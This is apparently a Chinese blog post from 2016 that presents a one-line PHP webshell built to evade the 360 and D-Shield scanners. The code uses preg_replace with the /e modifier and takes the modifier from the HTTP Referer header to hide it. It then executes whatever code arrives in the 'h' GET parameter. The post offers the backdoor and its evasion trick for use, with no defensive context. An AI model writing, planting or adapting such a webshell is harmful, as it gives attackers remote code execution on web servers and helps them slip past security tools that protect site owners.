---
layout: post
title:  "过360查杀D盾一句话"
date:   2016-11-12 17:04:52
comments: true
categories: php update
---
preg_replace(//) 函数加/e可以执行代码 。 这里的 “e”我使用referer的方式来获取， 绕过了检测

{% highlight php %}
<?php
$server= $_SERVER['HTTP_REFERER'];
$s[1]=$server;
preg_replace("/t/{$s[1]}",$_GET["h"],"t");


{% endhighlight %}
